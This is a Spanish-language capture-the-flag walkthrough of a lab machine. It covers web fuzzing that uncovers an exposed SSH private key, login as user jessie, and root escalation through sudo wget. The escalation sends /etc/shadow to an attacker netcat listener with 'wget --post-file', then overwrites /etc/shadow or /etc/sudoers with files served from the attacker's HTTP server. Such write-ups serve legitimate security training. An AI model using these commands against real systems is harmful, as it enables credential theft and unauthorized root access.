22/tcp open  ssh
80/tcp open  http

-Entramos a la web y hay un servidor default de apache. Hacemos CONTROL + U para inspeccionar el código fuente y encontramos esta info comentada:
	Jessie don't forget to udate the webiste 

-Parece que hay un usuario llamado Jessie

-Hacemos enumeración web y encontramos la siguiente ruta:
	/sitemap

-Es una página web realista. Después de investigarla vemos que no podemos hacer nada.

-Volvemos a hacer fuzzing web con el diccionario medium.txt, esta vez en la ruta /sitemap

-No encontramos nada interesante, vamos a probar a cambiar de diccionario a ver si encontramos algo de interés. Probamos con el big.txt:
	gobuster dir -w /usr/share/wordlists/dirb/big.txt -u 10.10.173.54/sitemap -x .html -t 50
	Encontramos la siguiente ruta: /.ssh/id_rsa

-Hemos encontrado una clave privada de ssh con la que podemos autenticarnos sin necesidad de contraseña. La introducimos junto con el usuario 'jessie' que encontramos anteriormente:
	chmod 0400 id_rsa
	ssh -i id_rsa jessie@10.10.173.54
	Estamos dentro --> jessie@CorpOne:~/Documents$


## Escalada de Privilegios

-sudo -l:
	(root) NOPASSWD: /usr/bin/wget

-Buscamos como escalar privilegios en gtfobins. Vemos que no podemos con ese método ya que utiliza el parámetro '--use-askpass' y la version de wget que hay instalada en la máquina no lo soporta.

-Buscamos otro método para escalar con /use/bin/wget, encontramos este:
	https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/

-Explicación: Vamos a cambiar la contraseña de root del /etc/shadow y luego autenticarnos con ella:
	1-Vemos el contenido del /etc/shadow de la máquina víctima:
		-Local machine: nc -lvnp 4444
		-Target machine: sudo /usr/bin/wget --post-file=/etc/shadow 10.9.2.165:4444
		- --post-file=/etc/shadow: Indica que el archivo '/etc/shadow' debe enviarse como datos del cuerpo de una petición HTTP POST a nuestra máquina.
	2-Creamos un archivo shadow.txt en nuestra máquina local y pegamos el contenido del /etc/shadow de la máquina víctima.
	3-Generamos un hash de contraseña mediante el algoritmo SHA-512. 'password' es la contraseña en texto claro que vamos a hashear.
		openssl passwd -6 -salt 'salt' 'password'
	4-Pegamos la contraseña en formato hash en el fichero shadow.txt:
		root:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:18195:0:99999:7::: .
		La cadena ':18195:0:99999:7:::' no la genera el comando 'openssl', son campos que indican valores como la fecha de la última modificación de la contraseña y más cosas. Cuando hicimos el paso 1 también venía, hay que fijarse y volverla a pegar alfinal.
	5-Transfermos el archivo de nuestra máquina local a la máquina víctima, despues cambiamos al usuario root con la contraseña que hemos generado:
		-Máquina local: python -m http.server 80
		-Máquina víctima: sudo /usr/bin/wget http://10.9.2.165/shadow.txt -O /etc/shadow 
			-El parámetro -O: Indica que el contenido de shadow.txt se guardará en el archivo /etc/shadow, sobrescribiendo el archivo original.
		-Nos autenticamos como el usuario root con la contraseña generada: 
			-su root
			-password: password
			root@CorpOne:~#

-Otra manera alternativa: También podríamos pasarnos el fichero /etc/sudoers y cambiar los permisos del usuario jessie para que pueda hacer como sudo /bin/bash sin necesidad de contraseña.
	Después de haber modificado el fichero /etc/sudoers y sobreescribirlo en la máquina víctima:
		sudo /bin/bash
		root@CorpOne:~#




